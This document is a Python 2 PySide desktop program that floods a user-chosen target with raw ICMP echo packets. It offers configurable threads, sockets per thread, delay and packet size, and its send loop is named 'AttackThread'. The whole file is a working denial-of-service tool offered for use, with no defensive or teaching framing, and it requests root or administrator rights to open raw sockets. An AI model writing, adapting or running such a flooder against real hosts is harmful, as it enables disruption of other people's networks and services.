#!/usr/bin/env python
# -*- coding: utf-8 -*-

from PySide.QtCore import * 
from PySide.QtGui import *

import os
import sys
import time
import random
import struct
import socket
import threading

import admin

### Constants ###
IS_ADMIN = False
IS_RANDOM = False

PACKETS_SENT = 0
ICMP_ECHO_REQUEST = 8

### Style sheet ###
STYLE = '''
QWidget {
	font-size: 14px;
}
'''

### ICMP Sender ###
''' Credit: https://gist.github.com/pklaus/856268 '''
class ICMPSender(object):
	def __init__(self):
		icmp = socket.getprotobyname("icmp")
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
		except socket.error, (errno, msg):
			if errno == 1:
				# Not admin
				raise socket.error("Cannot create socket because non-admin/root")
			raise

	def checksum(self, source_string):
		sum = 0
		countTo = (len(source_string)/2)*2
		count = 0
		while count<countTo:
			thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
			sum = sum + thisVal
			sum = sum & 0xffffffff 
			count = count + 2
		if countTo<len(source_string):
			sum = sum + ord(source_string[len(source_string) - 1])
			sum = sum & 0xffffffff 
		sum = (sum >> 16)  +  (sum & 0xffff)
		sum = sum + (sum >> 16)
		answer = ~sum
		answer = answer & 0xffff
		answer = answer >> 8 | (answer << 8 & 0xff00)
		return answer

	def create_packet(self, _id, data_size):
		_checksum = 0
		header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, _checksum, _id, 1)

		# create data
		data = (data_size - struct.calcsize("d")) * "Q"
		data = struct.pack("d",time.time()) + data

		# get checksum
		_checksum = self.checksum( header + data )

		# now that checksum is made, repack packet with new checksum
		header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0,
							_checksum, _id, 1)

		return header + data

	def send_packet(self, ip_addr, data_size=64, timeout=1):
		# os id
		_id = os.getpid() & 0xFFFF

		# create packet
		packet = self.create_packet( _id, int(data_size) )

		# icmp doesn't use port but function expects it
		# so provide it with dummy port
		self.sock.sendto( packet, (ip_addr, 1))


### GUI Window ###
class MainWindow(QWidget):
	WIDTH = 480
	HEIGHT = 240
	RUNNING = False

	def __init__(self):
		super(MainWindow, self).__init__()

		# create all widgets
		self.initUI()

		# start widget updater
		self.startThread(self.updateThread)
		

	### Attack Thread ###
	def AttackThread(self, ip_addr, delay=10, sock_num=1, data_size=64, _random=False):
		# create sockets
		socks = []
		for i in range( int(sock_num) ):
			new_socket = ICMPSender()
			socks.append( new_socket )

		# get other values
		global PACKETS_SENT
		time_delay = int(delay) / 1000.0

		# start attack
		while self.RUNNING:
			try:
				# use all sockets to send a packet
				for sock in socks:

					# make random playload size if checked
					if _random:
						data_size = random.randint(1,1472)

					# send packet with thread
					sock.send_packet( str(ip_addr), int(data_size) )
					PACKETS_SENT += 1

				# wait for delay
				time.sleep( time_delay )	
			except Exception as e:
				print str(e)
				break

		# delete existing sockets
		for sock in socks:
			sock.sock.close()
			del sock
		del socks

	### Thread Spawner ###
	def createThreads(self):
		# reset packet counter
		global PACKETS_SENT
		PACKETS_SENT = 0

		# get random setting
		if self.random_select.isChecked():
			_random = True
		else:
			_random =  False

		# get target ip
		_ip_addr = self.target_box.text()
		try:
			_ip_addr = str( socket.gethostbyname( _ip_addr ) )
		except:
			error_msg = QMessageBox()
			error_msg.setIcon( QMessageBox.Critical )
			error_msg.setWindowTitle("Socket Lookup Error")
			error_msg.setText(unicode("Couldn't get IP address!"))
			error_msg.exec_()
			self._enable()
			return

		# get data
		_data_size = self.data_slider.value()
		# get delay
		_delay = self.delay_box.text()
		# get threads
		_threads = self.thread_box.text()
		# get socks per threads
		_socks = self.socks_box.text()

		# start attack threads
		self.RUNNING = True
		for i in range( int(_threads) ):
			self.startThread( self.AttackThread, 
				_ip_addr, _delay, _socks, _data_size, _random)
		
	def startThread(self, func, *args):
		thread = threading.Thread(target=func, args=args)
		thread.daemon = True
		thread.start()

	### Packet Tracker ###
	def updateThread(self):
		global PACKETS_SENT

		while True:
			try:
				self.sent_value.setText(str( PACKETS_SENT ))
				time.sleep(0.01)
			except:
				break

	### Start/Stopper ###
	def statusChange(self):
		if self.RUNNING:
			self.RUNNING = False
			self.attack_button.setText("Send")
			self._enable()

		else:
			self.RUNNING = True
			self.attack_button.setText("Stop")
			self.createThreads()
			self._disable()

	def _enable(self):
		self.target_box.setEnabled(True)
		self.data_slider.setEnabled(True)
		self.delay_box.setEnabled(True)
		self.thread_box.setEnabled(True)
		self.socks_box.setEnabled(True)
		self.random_select.setEnabled(True)
	def _disable(self):
		self.target_box.setEnabled(False)
		self.data_slider.setEnabled(False)
		self.delay_box.setEnabled(False)
		self.thread_box.setEnabled(False)
		self.socks_box.setEnabled(False)
		self.random_select.setEnabled(False)

	### Filter functions ###
	def trackSlider(self):
		slider_val = self.data_slider.value()
		self.data_value.setText( str(slider_val) + " B" )

	# only int in text (theres probably a a more efficient way of doing this)
	def setOnlyInt(self, text):
		valid = [str(x) for x in range(10)]
		final = ''
		for char in text:
			if char in valid:
				final += char
		return final

	# disable slider when random is checked
	def whenChecked(self, *args):
		if self.random_select.isChecked():
			self.data_slider.setEnabled(False)
		else:
			self.data_slider.setEnabled(True)

	# only allow int for inputs
	def delayChanged(self, text):
		self.delay_box.setText(self.setOnlyInt(str(text)))

	def threadChanged(self,text):
		self.thread_box.setText(self.setOnlyInt(str(text)))

	def socksChanged(self,text):
		self.socks_box.setText(self.setOnlyInt(str(text)))

	### Widget Creation ###
	def createWidgets(self):

		# create layouts
		target_layout   = QHBoxLayout()
		data_layout     = QHBoxLayout()
		random_layout   = QHBoxLayout()
		settings_layout = QGridLayout()

		# create widgets
		self.target_box     = QLineEdit()
		self.data_slider    = QSlider()
		self.data_value     = QLabel("0 B")
		self.delay_box      = QLineEdit()
		self.thread_box     = QLineEdit()
		self.socks_box      = QLineEdit()
		self.attack_button  = QPushButton("Send")
		self.reset_button   = QPushButton("Reset")
		self.random_select  = QCheckBox("Random Size")
		self.sent_value     = QLabel()

		# widget presets
		self.target_box.setText("127.0.0.1")
		self.data_slider.setOrientation( Qt.Horizontal )
		self.data_slider.setRange(1, 1472) #1472 max pkt size before fragment
		self.data_slider.setPageStep(1)
		self.delay_box.setText("10")
		self.thread_box.setText("1")
		self.socks_box.setText("1")
		self.sent_value.setText("0")
		self.sent_value.setStyleSheet("font: bold 'Verdana';font-size: 20px;")
		self.sent_value.setAlignment( Qt.AlignCenter )
		self.attack_button.setMinimumHeight(50)

		# bind widget actions
		self.attack_button.clicked.connect(self.statusChange)
		self.socks_box.textChanged.connect(self.socksChanged)
		self.thread_box.textChanged.connect(self.threadChanged)
		self.delay_box.textChanged.connect(self.delayChanged)
		self.data_slider.valueChanged.connect(self.trackSlider)
		self.random_select.stateChanged.connect(self.whenChecked)

		# add widgets to layouts
		target_layout.addWidget( QLabel("Target:") )
		target_layout.addWidget( self.target_box )

		data_layout.addWidget( QLabel("Packet Size:") )
		data_layout.addWidget( self.data_slider )
		data_layout.addWidget( self.data_value )

		random_layout.addStretch(1)
		random_layout.addWidget( self.random_select )

		settings_layout.addWidget( QLabel("Delay:") , 0, 0)
		settings_layout.addWidget( self.delay_box , 0, 1)

		settings_layout.addWidget( QLabel("Threads:") , 1, 0)
		settings_layout.addWidget( self.thread_box , 1, 1)

		settings_layout.addWidget( QLabel("Sockets per Thread:") , 2, 0)
		settings_layout.addWidget( self.socks_box , 2, 1)


		# add layouts to final layout
		self.layout.addLayout( target_layout )
		self.layout.addLayout( data_layout )
		self.layout.addLayout( random_layout )
		self.layout.addLayout( settings_layout )
		self.layout.addWidget( self.sent_value )

		self.layout.addStretch(1)
		self.layout.addWidget( self.attack_button )

	### UI settings and creation ###
	def initUI(self):
		self.resize( self.WIDTH, self.HEIGHT )
		self.setWindowTitle( "I. C. M.y P.ackets" )

		self.layout = QVBoxLayout()
		self.layout.setSpacing(15)
		self.setLayout(self.layout)

		self.setStyleSheet( STYLE )

		self.createWidgets()

# Make sure script is admin/root
def runAsAdmin():
	global IS_ADMIN
	os_name = os.name

	# case windows
	if 'nt' in os_name:
		if not admin.isUserAdmin():
			admin.runAsAdmin()
		else:
			IS_ADMIN = True

	# case unix
	else:
		if not os.geteuid() == 0:
			sys.exit("Run Script as Root\n ex: sudo python " + str(sys.argv[0]))

if __name__ == '__main__':
	# check for admin
	runAsAdmin()

	# run the script
	if IS_ADMIN:
		app = QApplication(sys.argv)

		win = MainWindow()
		win.show()

		sys.exit(app.exec_())